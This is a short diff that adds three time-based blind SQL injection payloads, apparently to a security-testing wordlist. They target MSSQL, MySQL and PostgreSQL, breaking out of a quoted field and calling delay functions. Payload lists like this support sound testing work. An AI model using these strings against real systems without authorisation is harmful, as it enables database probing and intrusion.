@@ -1,0 +1,3 @@
+'waitfor delay '0:0:05';--
+' or sleep(5)#
+' union select null,null from pg_sleep(10)--
